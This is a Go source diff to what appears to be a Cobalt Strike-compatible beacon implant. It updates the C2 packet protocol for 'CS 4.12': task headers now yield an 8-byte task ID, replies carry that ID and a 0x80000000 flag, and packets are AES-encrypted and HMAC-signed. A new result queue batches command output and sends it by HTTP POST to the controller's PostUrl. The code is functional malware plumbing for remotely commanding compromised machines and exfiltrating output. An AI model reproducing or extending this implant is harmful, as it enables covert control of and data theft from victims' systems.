@@ -88,57 +88,63 @@ func DetectTaskHeaderLen(taskData []byte, totalLen uint32) int {
 	return 0
 }
 
-func ParsePacket(buf *bytes.Buffer, totalLen *uint32, taskHeaderLen int) (uint32, []byte, error) {
+func ParsePacket(buf *bytes.Buffer, totalLen *uint32, taskHeaderLen int) (uint32, [8]byte, []byte, error) {
+	var taskID [8]byte
+
 	commandTypeBytes := make([]byte, 4)
 	_, err := buf.Read(commandTypeBytes)
 	if err != nil {
-		return 0, nil, fmt.Errorf("reading command type: %w", err)
+		return 0, taskID, nil, fmt.Errorf("reading command type: %w", err)
 	}
 	commandType := binary.BigEndian.Uint32(commandTypeBytes)
 	commandLenBytes := make([]byte, 4)
 	_, err = buf.Read(commandLenBytes)
 	if err != nil {
-		return 0, nil, fmt.Errorf("reading command length: %w", err)
+		return 0, taskID, nil, fmt.Errorf("reading command length: %w", err)
 	}
 	commandLen := ReadInt(commandLenBytes)
 
-	// Skip the per-task header if present (CS 4.12+)
+	// Read per-task header if present (CS 4.12+)
 	if taskHeaderLen > 0 {
 		headerBytes := make([]byte, taskHeaderLen)
 		_, err = buf.Read(headerBytes)
 		if err != nil {
-			return 0, nil, fmt.Errorf("reading task header: %w", err)
+			return 0, taskID, nil, fmt.Errorf("reading task header: %w", err)
 		}
+		copy(taskID[:], headerBytes[:8])
 	}
 
 	commandBuf := make([]byte, commandLen)
 	_, err = buf.Read(commandBuf)
 	if err != nil {
-		return 0, nil, fmt.Errorf("reading command data: %w", err)
+		return 0, taskID, nil, fmt.Errorf("reading command data: %w", err)
 	}
 	*totalLen -= (4 + 4 + uint32(taskHeaderLen) + commandLen)
 
-	return commandType, commandBuf, nil
+	return commandType, taskID, commandBuf, nil
 }
 
-func MakePacket(replyType int, b []byte) []byte {
+func MakePacket(replyType int, taskID [8]byte, b []byte) []byte {
 	constants.Counter += 1
 	buf := new(bytes.Buffer)
 	counterBytes := make([]byte, 4)
 	binary.BigEndian.PutUint32(counterBytes, uint32(constants.Counter))
 	buf.Write(counterBytes)
 
-	if b != nil {
-		resultLenBytes := make([]byte, 4)
-		resultLen := len(b) + 4
-		binary.BigEndian.PutUint32(resultLenBytes, uint32(resultLen))
-		buf.Write(resultLenBytes)
-	}
+	// resultLen = 4 (replyType) + 8 (taskID) + len(data)
+	dataLen := len(b)
+	resultLen := 4 + 8 + dataLen
+	resultLenBytes := make([]byte, 4)
+	binary.BigEndian.PutUint32(resultLenBytes, uint32(resultLen))
+	buf.Write(resultLenBytes)
 
+	// OR the reply type with MSB flag (0x80000000) for CS 4.12
 	replyTypeBytes := make([]byte, 4)
-	binary.BigEndian.PutUint32(replyTypeBytes, uint32(replyType))
+	binary.BigEndian.PutUint32(replyTypeBytes, uint32(replyType)|0x80000000)
 	buf.Write(replyTypeBytes)
 
+	// Prepend task ID before data
+	buf.Write(taskID[:])
 	buf.Write(b)
 
 	encrypted, err := cryptography.AesCBCEncrypt(buf.Bytes(), constants.AesKey)
@@ -159,7 +165,26 @@ func MakePacket(replyType int, b []byte) []byte {
 	buf.Write(hmacHashBytes)
 
 	return buf.Bytes()
+}
 
+var resultQueue [][]byte
+
+func QueueResult(packet []byte) {
+	resultQueue = append(resultQueue, packet)
+}
+
+func FlushResults() {
+	if len(resultQueue) == 0 {
+		return
+	}
+	var combined []byte
+	for _, p := range resultQueue {
+		combined = append(combined, p...)
+	}
+	url := constants.PostUrl
+	id := strconv.Itoa(clientID)
+	HttpPost(url, id, combined)
+	resultQueue = nil
 }
 
 func EncryptedMetaInfo() string {
@@ -289,9 +314,3 @@ func PullCommand() *http.Response {
 	return resp
 }
 
-func PushResult(b []byte) *http.Response {
-	url := constants.PostUrl
-	id := strconv.Itoa(clientID)
-	resp := HttpPost(url, id, b)
-	return resp
-}
